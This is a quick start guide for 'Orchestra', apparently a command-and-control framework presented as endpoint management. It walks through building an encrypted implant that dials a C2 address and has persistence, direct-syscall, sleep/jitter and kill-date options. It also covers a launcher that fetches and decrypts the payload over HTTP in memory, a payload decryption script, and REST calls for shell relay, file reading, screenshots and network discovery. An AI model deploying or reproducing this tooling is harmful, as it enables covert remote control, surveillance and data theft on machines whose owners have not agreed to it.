# Quick Start Guide

This guide walks you from a fresh `git clone` to issuing your first command on
a managed endpoint in eight steps. It covers both Linux/macOS and Windows.

---

## Table of contents

1. [Prerequisites](#1-prerequisites)
2. [Clone the repository](#2-clone-the-repository)
3. [Run the quickstart script](#3-run-the-quickstart-script)
4. [Open the dashboard](#4-open-the-dashboard)
5. [Review the generated profile](#5-review-the-generated-profile)
6. [Deploy the agent](#6-deploy-the-agent)
7. [Verify connectivity](#7-verify-connectivity)
8. [Issue your first command](#8-issue-your-first-command)

---

## 1. Prerequisites

Install the following before starting:

| Tool | How to install |
|---|---|
| **Git** | System package manager |
| **Rust** (stable) | `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \| sh` (Unix) or [rustup.rs](https://rustup.rs) (Windows) |
| **C compiler** | `gcc`/`clang` (Unix), Visual Studio Build Tools (Windows) |
| **OpenSSL CLI** | `apt install openssl` / `brew install openssl` / Windows installer; used by certificate-generation scripts |
| **pkg-config** | Optional for host packages that need it; default TLS builds use Rustls/ring and do not require `libssl-dev` |
| **Zig** | Required for the checked Darwin, Windows MSVC, and Linux ARM64 cross-target C build scripts on Linux hosts |

> **Tip:** The quickstart script checks for Rust and offers to install it. It
> also verifies the build toolchain, so you can just run it and follow any
> prompts.

### Verify

```sh
cargo --version        # should print e.g. cargo 1.82.0
rustc --version        # should print e.g. rustc 1.82.0
git --version          # should print a recent version
```

Or use the bundled verification script:

```sh
./scripts/verify-setup.sh
```

This checks all required and optional dependencies and prints a pass/fail
report.

---

## 2. Clone the repository

```sh
git clone https://github.com/t-h-i-n-k-er/orchestra.git
cd orchestra
```

---

## 3. Run the quickstart script

### Linux / macOS

```sh
./scripts/quickstart.sh
```

### Windows

```bat
scripts\quickstart.bat
```

### What the script does

The quickstart script automates the entire setup:

1. **Checks for Rust** — offers to install via `rustup` if missing.
2. **Builds `orchestra-builder`** in release mode.
3. **Detects your platform** — OS, architecture, and LAN IP.
4. **Generates random credentials** — AES-256 encryption key, agent PSK, admin bearer token.
5. **Creates a self-signed TLS certificate** — covers `127.0.0.1`, your LAN IP, and `localhost`.
6. **Writes a default outbound profile** — `profiles/default.toml` with `outbound-c` enabled.
7. **Builds the agent payload** — encrypted binary in `dist/default.enc`.
8. **Writes `orchestra-server.toml`** — server config with matching credentials.
9. **Builds the Control Center** — `orchestra-server` in release mode.
10. **Prints credentials and URLs** — dashboard URL, bearer token, payload path.

When the script asks **"Start the Orchestra Control Center now?"**, say **y**.

### Customisation

| Variable | Default | Purpose |
|---|---|---|
| `ORCHESTRA_PROFILE` | `default` | Profile name |
| `ORCHESTRA_HTTP_PORT` | `8443` | Dashboard HTTPS port |
| `ORCHESTRA_AGENT_PORT` | `8444` | Agent listener port |
| `ORCHESTRA_SKIP_SERVER` | `0` | Set to `1` to skip auto-start |

```sh
ORCHESTRA_HTTP_PORT=9443 ORCHESTRA_AGENT_PORT=9444 ./scripts/quickstart.sh
```

---

## 4. Open the dashboard

1. Open a browser and navigate to the URL printed by the quickstart:

   ```
   https://<your-ip>:8443/
   ```

2. Your browser will warn about the self-signed certificate. Click **Advanced** → **Proceed** (safe on a local network; use a real certificate in production).

3. The dashboard prompts for a bearer token. Paste the **Admin bearer token** from the quickstart output.

4. You should see an empty **Agents** table — no endpoints are connected yet.

### Dashboard tabs

| Tab | Purpose |
|---|---|
| **Dashboard** | Lists connected agents; command panel with 100+ commands across 10 categories. |
| **Shell** | Interactive shell relay to the selected agent. |
| **Builder** | Full agent build form (target, C2 params, feature flags, PE artifact kit, profile management). |
| **Audit Log** | Live-updating filtered audit log view (JSONL). |

---

## 5. Review the generated profile

The quickstart creates `profiles/default.toml`. Open it to see the configuration:

```toml
target_os               = "linux"
target_arch             = "x86_64"
c2_address              = "192.168.1.100:8444"
encryption_key          = "<random-base64>"
c_server_secret         = "<random-base64>"    # must match agent_shared_secret in orchestra-server.toml
server_cert_fingerprint = "<sha256-64-hex>"    # SHA-256 of server TLS cert DER
module_aes_key          = "<random-base64>"    # 32-byte AES-256 key for module auth
features                = ["outbound-c"]
package                 = "agent"
bin_name                = "agent-standalone"
```

Key fields:

| Field | Meaning |
|---|---|
| `c2_address` | The `host:port` the agent dials. Must match `agent_addr` in `orchestra-server.toml`. |
| `encryption_key` | AES-256 key used to encrypt the payload at rest. |
| `c_server_secret` | Pre-shared key the agent uses to authenticate. Must match `agent_shared_secret` in server config. |
| `server_cert_fingerprint` | SHA-256 DER fingerprint the agent pins against. Use the "Fetch Pin" button in the Builder tab. |
| `module_aes_key` | 32-byte AES-256 key for module authentication. Required in production builds. |
| `features` | Cargo features compiled into the agent binary. |
| `package` | Must be `"agent"` (never `"launcher"`). |
| `bin_name` | `"agent-standalone"` for outbound deployments. |

To create a profile for a different target OS:

```sh
# Edit profiles/default.toml and change target_os / target_arch,
# or create a new profile:
./scripts/setup.sh    # interactive wizard
```

---

## 6. Deploy the agent

### Option A: Build via the web dashboard (recommended)

1. Open the **Builder** tab in the dashboard.
2. Fill in:
   - **Target Platform**: OS (`linux`, `windows`, `macos`) and architecture (`x86_64`, `aarch64`).
   - **C2 Connection**: Host, port, and TLS pin (click **Fetch Pin** to auto-populate).
   - **Encryption Key**: Generate a random AES-256 key.
   - **Behavior**: Sleep interval, jitter, kill date.
   - **Features**: Check desired feature boxes.
3. Click **Build Agent**. The build log streams in real time (~30s).
4. When complete, click **Download** to retrieve the encrypted `.enc` payload.
5. Decrypt the payload:

```python
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

AES_GCM_INFO = b"\x01\x8c\xa3\xf2\x6b\x4d\xe7\x90\x5a\x1f\xbc\xd8\x3e\x72\x09\xaf"
enc_key = base64.b64decode("<your-encryption-key>")
data = open('agent.enc', 'rb').read()
salt, nonce, ct = data[:32], data[32:44], data[44:]
key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt, info=AES_GCM_INFO).derive(enc_key)
plaintext = AESGCM(key).decrypt(nonce, ct, None)
open('agent', 'wb').write(plaintext)
```

6. Copy the decrypted binary to the target endpoint and execute it.

### Option B: Build via REST API

```bash
# Submit build
curl -sk -X POST https://localhost:8443/api/build \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "os": "linux", "arch": "x86_64",
    "host": "10.0.0.5", "port": 8444,
    "pin": "<64-hex-fingerprint>",
    "key": "<base64-aes256-key>",
    "features": {"persistence": true, "direct_syscalls": true},
    "sleep_ms": 5000, "jitter": 20
  }'
# → {"job_id":"<uuid>","status":"Queued"}

# Poll
curl -sk -H "Authorization: Bearer <admin-token>" \
  https://localhost:8443/api/build/status/<job_id>

# Download when status = "Complete"
curl -sk -H "Authorization: Bearer <admin-token>" \
  https://localhost:8443/api/build/<job_id>/download -o agent.enc
```

### Option C: Direct development build

```sh
# Build directly with cargo (for development only)
cargo build --release -p agent --features outbound-c \
    --bin agent-standalone
```

The agent dials the Control Center at the address baked into the binary during
build. No command-line flags are needed for release builds.

> **Debug builds** can override the baked address with environment variables:
> ```sh
> ORCHESTRA_C=10.0.0.5:8444 ORCHESTRA_SECRET=mysecret ./agent-standalone
> ```

### Option D: Launcher + payload (for in-memory delivery)

The launcher is a small stub that fetches and decrypts an encrypted payload
over HTTP at runtime. This is useful when you want to serve the agent from a
central location.

```sh
# 1. Start the dev-server to serve the encrypted payload:
cargo run --release -p dev-server -- --port 8000

# 2. Build the launcher for the target platform:
cargo build --release -p launcher

# 3. Copy the launcher to the endpoint and run:
./launcher --url http://<this-host>:8000/default.enc --key '<encryption-key>'
```

> **Important:** The launcher stub is deployed *directly* to the endpoint. The
> encrypted agent payload is what gets served over HTTP. Never use
> `package = "launcher"` in a profile — the Builder will reject it.

---

## 7. Verify connectivity

After starting the agent on the target endpoint:

1. Return to the dashboard at `https://<your-ip>:8443/`.
2. The agent should appear in the **Agents** table within a few seconds.
3. You'll see:
   - **agent_id** — hostname + random suffix.
   - **connection_id** — server-assigned unique connection identifier.
   - **last_seen** — Unix timestamp of the last heartbeat.
   - **peer** — IP:port of the connecting agent.

If the agent doesn't appear:

| Symptom | Check |
|---|---|
| Agent exits immediately | Check that `module_aes_key` is set in server config and baked in via the build pipeline. |
| Agent exits with "No C2 address" | Verify `ORCHESTRA_C_ADDR` → `SYS_C_ADDR` forwarding in `agent/build.rs`. |
| `connection refused` | Firewall blocking agent port (default 8444). Verify `agent_addr` in server config. |
| `AES-GCM authentication failed` | PSK mismatch — `c_server_secret` in profile must equal `agent_shared_secret` in server config verbatim. |
| `tls handshake failure` | Certificate fingerprint mismatch — regenerate cert or re-fetch pin via dashboard. |

For deeper diagnostics:

```sh
RUST_LOG=debug,orchestra=trace ./agent
```

Via API:

```bash
curl -sk -H "Authorization: Bearer <admin-token>" \
  https://127.0.0.1:8443/api/agents | python3 -m json.tool
```

---

## 8. Issue your first command

From the **Dashboard** tab, select your agent from the table. The command panel
will appear. Choose a command category and dispatch:

### From the dashboard (Shell tab)

Click the **Shell** tab for an interactive shell session. Commands sent through
the shell are relayed to the agent's PTY and responses stream back in real time.

### From the command panel

Select a command category and fill in any parameters:

| Command | Category | Parameters |
|---------|----------|------------|
| `Ping` | Core | — |
| `GetSystemInfo` | Core | — |
| `ListDirectory` | Filesystem | `path` |
| `ReadFile` | Filesystem | `path` |
| `Screenshot` | Surveillance | — |
| `DiscoverNetwork` | Discovery | `subnet`, `ports` |

### Via REST API

```bash
AGENT_ID="Nier-1b0a7c4a-52bb-4866-89bc-0f2965756c49"

# Ping
curl -sk -X POST "https://127.0.0.1:8443/api/agents/$AGENT_ID/command" \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"command": "Ping"}'

# Get system info (verified working — returns cpu_count, hostname, memory, OS)
curl -sk -X POST "https://127.0.0.1:8443/api/agents/$AGENT_ID/command" \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"command": "GetSystemInfo"}'
# → {"task_id":"...","outcome":"ok","output":"{\"cpu_count\":16,\"hostname\":\"Nier\",...}","error":null}

# List directory
curl -sk -X POST "https://127.0.0.1:8443/api/agents/$AGENT_ID/command" \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"command": {"ListDirectory": {"path": "/tmp"}}}'
```

> See [INTEGRATION_TEST_WALKTHROUGH.md](INTEGRATION_TEST_WALKTHROUGH.md) for a
> complete verified end-to-end test record with real output.

---

## Next steps

- **Enable additional features** — edit the profile and add features like
  `persistence`, `network-discovery`, or `remote-assist`. See
  [FEATURES.md](FEATURES.md) for the complete reference.
- **Configure for production** — replace the self-signed TLS certificate,
  rotate credentials, set up a reverse proxy. See
  [CONTROL_CENTER.md](CONTROL_CENTER.md) for production hardening.
- **Understand the architecture** — see [ARCHITECTURE.md](ARCHITECTURE.md)
  for wire protocol, crypto, and transport details.
- **Review security practices** — see [SECURITY.md](SECURITY.md) for the
  threat model and hardening checklist.
- **Set up TLS certificates** — use `./scripts/generate-certs.sh` or supply
  your own certificates.

## Interactive wizard

For more control over every parameter, use the interactive setup wizard:

```sh
./scripts/setup.sh          # Linux / macOS
```

The wizard prompts for:

1. Profile name
2. Target OS and architecture
3. Deployment style (outbound vs launcher)
4. Control Center address
5. Optional Cargo features
6. Credential generation
7. TLS certificate generation
8. Cross-compilation toolchain setup
9. Payload build
10. Server start

Windows users can use the PowerShell equivalent:

```powershell
.\scripts\setup.ps1
```

## Cross-compilation

To build for a platform different from your host:

```sh
# Install the target
rustup target add x86_64-pc-windows-gnu x86_64-pc-windows-msvc aarch64-pc-windows-msvc
rustup target add aarch64-unknown-linux-gnu x86_64-apple-darwin aarch64-apple-darwin

# Build the agent for Windows from Linux
cargo build --release -p agent --target x86_64-pc-windows-gnu \
    --features outbound-c --bin agent-standalone

# Or use the Builder with a profile
# (edit profiles/my_agent.toml to set target_os = "windows")
./target/release/orchestra-builder build my_agent
```

For Windows GNU builds from Linux, install `mingw-w64`. For Windows MSVC,
Darwin, and Linux ARM64 targets with C build scripts, the repository's
`.cargo/config.toml` uses the Zig wrapper scripts in `scripts/`; keep `zig` on
`PATH`. See [ARCHITECTURE.md](ARCHITECTURE.md) for transport-level details.

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `cargo` not found | Rust not installed | Run `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \| sh` |
| Build fails with linker error | Missing C toolchain for target | Install `mingw-w64` for Windows GNU or `zig` for the configured Darwin/MSVC/Linux ARM64 wrappers |
| Agent exits with `connection refused` | Server not running or wrong port | Start the Control Center; verify `agent_addr` matches profile's `c2_address` |
| `AES-GCM authentication failed` | PSK mismatch | Regenerate profile and server config together with `quickstart.sh` |
| TLS handshake failure | Certificate mismatch | Regenerate certs with `./scripts/generate-certs.sh` and update fingerprint |
| Agent not visible in dashboard | Agent not connected | Check agent logs with `RUST_LOG=debug`; verify network connectivity |
| `Path is not under any allowed root` | File operation outside `allowed_paths` | Add the directory to `allowed_paths` in `agent.toml` |
| Plugin load fails with `ELF magic` | Wrong target architecture | Rebuild the plugin for the agent's target triple |

For verbose logging on either side:

```sh
# Agent
RUST_LOG=debug,orchestra=trace ./agent-standalone

# Server
RUST_LOG=debug,orchestra=trace ./target/release/orchestra-server --config orchestra-server.toml
```
